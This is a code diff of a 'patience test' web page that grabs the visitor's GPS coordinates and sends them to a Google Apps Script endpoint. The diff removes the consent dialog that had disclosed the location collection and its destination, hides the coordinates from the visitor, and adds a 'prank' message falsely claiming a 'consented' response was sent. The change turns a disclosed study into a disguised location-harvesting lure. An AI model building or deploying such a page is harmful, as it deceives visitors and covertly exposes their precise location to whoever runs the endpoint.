@@ -73,6 +73,11 @@ button:hover {
   box-shadow: 0 8px 25px #d8c4ff55;
 }
 
+button:disabled {
+  opacity: 0.6;
+  cursor: wait;
+}
+
 .quote {
   margin-top: 28px;
   color: #e7dfff;
@@ -84,6 +89,27 @@ button:hover {
   margin-top: 35px;
   color: #c8bce9;
   font-size: 11px;
+}
+
+#result {
+  margin-top: 25px;
+  line-height: 1.6;
+}
+
+.prank {
+  padding: 18px;
+  border: 1px solid #ffaaaa;
+  border-radius: 14px;
+  background: #ff000022;
+}
+
+.prank h2 {
+  color: #ffbaba;
+  margin-bottom: 12px;
+}
+
+.prank p {
+  margin-top: 8px;
 }
 
 @keyframes float {
@@ -106,8 +132,8 @@ button:hover {
     Are you ready to test yourself?
   </p>
 
-  <button onclick="getLocation()">
-    To test your patience level click here
+  <button id="testButton" onclick="getLocation()">
+    Click here to check your patience
   </button>
 
   <p class="quote" id="quote">
@@ -118,13 +144,13 @@ button:hover {
     A LITTLE TEST OF PATIENCE © 2026
   </p>
 
-  <p id="result" style="margin-top:20px"></p>
+  <div id="result" aria-live="polite"></div>
 
 </div>
 
-
 <script>
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1BHs_hESdgHA_v-6xixllmBUmRlJ8jm-2F8Yh7d0aecit13tt936Y5EfODE5m0JQN/exec";
+const SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbx1BHs_hESdgHA_v-6xixllmBUmRlJ8jm-2F8Yh7d0aecit13tt936Y5EfODE5m0JQN/exec";
 
 const quotes = [
   "Patience is the key to everything.",
@@ -137,40 +163,37 @@ const quotes = [
 document.getElementById("quote").innerText =
   '"' + quotes[Math.floor(Math.random() * quotes.length)] + '"';
 
+function showPrank() {
+  document.getElementById("result").innerHTML = `
+    <div class="prank">
+      <h2>⚠️ Unable to Proceed!</h2>
+      <p>Something unexpected happened...</p>
+      <p><strong>😂 Haha! It's a prank!</strong></p>
+      <p>Your consented study response was submitted successfully.</p>
+    </div>
+  `;
+}
+
 function getLocation() {
   const result = document.getElementById("result");
+  const button = document.getElementById("testButton");
 
   if (!navigator.geolocation) {
-    result.innerText = "GPS is not supported.";
+    result.innerText = "GPS is not supported by this browser.";
     return;
   }
 
-  const consent = confirm(
-    "This study will collect your GPS coordinates, " +
-    "including latitude, longitude and accuracy, " +
-    "and send them to the study owner through Telegram. " +
-    "Do you agree?"
-  );
-
-  if (!consent) {
-    result.innerText = "Location sharing was not approved.";
-    return;
-  }
-
+  button.disabled = true;
   result.innerText = "Getting your location...";
 
   navigator.geolocation.getCurrentPosition(
     async function(position) {
+
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const accuracy = position.coords.accuracy;
 
-      result.innerHTML =
-        "<b>Location received!</b><br><br>" +
-        "Latitude: " + latitude + "<br>" +
-        "Longitude: " + longitude + "<br>" +
-        "Accuracy: " + accuracy.toFixed(1) + " meters<br><br>" +
-        "Submitting your study response...";
+      result.innerText = "Submitting your study response...";
 
       try {
         const response = await fetch(SCRIPT_URL, {
@@ -188,19 +211,25 @@ function getLocation() {
 
         const data = await response.json();
 
-        result.innerHTML += data.success
-          ? "<br><b>Study response submitted successfully.</b>"
-          : "<br>Submission failed. Please try again.";
+        if (data.success) {
+          showPrank();
+        } else {
+          result.innerText =
+            "Submission failed. Please try again.";
+        }
 
       } catch (error) {
-        result.innerHTML +=
-          "<br>Could not confirm submission. Please try again.";
+        result.innerText =
+          "Could not confirm submission. Please try again.";
+      } finally {
+        button.disabled = false;
       }
     },
 
     function(error) {
       result.innerText =
-        "Unable to get location. Please check permission.";
+        "Unable to get location. Please check your permission.";
+      button.disabled = false;
     },
 
     {
@@ -211,5 +240,6 @@ function getLocation() {
   );
 }
 </script>
+
 </body>
 </html>
